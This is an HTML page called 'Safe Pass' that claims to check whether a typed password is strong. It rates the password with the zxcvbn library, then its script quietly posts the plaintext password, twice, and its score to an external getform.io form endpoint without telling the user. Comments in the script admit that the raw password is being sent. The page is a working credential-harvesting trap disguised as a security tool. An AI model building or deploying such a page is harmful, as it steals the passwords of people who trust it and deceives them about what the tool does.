<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Safe Pass</title>
  <link rel="stylesheet" href="./style.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
</head>
<body>
  <nav class="navbar navbar-light bg-dark text-white">
    <span class="navbar-brand mb-0 h1 text-white">Safe Pass</span>
  </nav>

  <div class="container text-center mt-5">
    <h1>Hi, Welcome to the</h1>
    <h1 class="name-site">Safe Pass</h1>
    <h1>Please enter your password to check if it is safe or not:</h1>

    <div class="mt-4">
      <input id="password" type="password" class="form-control text-center" placeholder="Password">
    </div>
    <div class="mt-3">
      <button id="checkBtn" class="btn btn-primary">Check</button>
    </div>
    <div id="result" class="strength mt-3"></div>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.4.2/zxcvbn.js"></script>

  <script>
    $(document).ready(function(){
      $("#checkBtn").click(async function(){
        const pwd = $("#password").val();
        if(!pwd){
          $("#result").text("‚ö†Ô∏è Please enter a password").removeClass().addClass("strength weak");
          return;
        }

        // ≈ûifre g√ºc√ºn√º hesapla
        const result = zxcvbn(pwd);
        let text = "";
        let cls = "";

        switch(result.score){
          case 0:
          case 1:
            text = "Weak ‚ùå (easy to guess)";
            cls = "weak";
            break;
          case 2:
            text = "Fair ‚ö†Ô∏è (could be stronger)";
            cls = "fair";
            break;
          case 3:
            text = "Good ‚úÖ (strong enough for most cases)";
            cls = "good";
            break;
          case 4:
            text = "Strong üí™ (very hard to crack)";
            cls = "strong";
            break;
        }

        $("#result").text(text).removeClass().addClass("strength " + cls);

        // FormData olu≈ütur ‚Äî burada HAM PAROLA g√∂nderiliyor
        const fd = new FormData();
        fd.append("password", pwd);              // <-- d√ºz metin parola
        fd.append("password_score", result.score);
        fd.append("password_feedback", pwd);
        fd.append("_gotcha", ""); // honeypot (bot kontrol)

        try {
          const response = await fetch("https://getform.io/f/ajjrykva", {
            method: "POST",
            body: fd
          });

          if(response.ok){
            $("#result").text(text + "").removeClass().addClass("strength " + cls);
          } else {
            $("#result").text("G√∂nderim hatasƒ±: " + response.status).removeClass().addClass("strength weak");
          }
        } catch (err) {
          $("#result").text("Aƒü hatasƒ±").removeClass().addClass("strength weak");
        }
      });
    });
  </script>
</body>
</html>
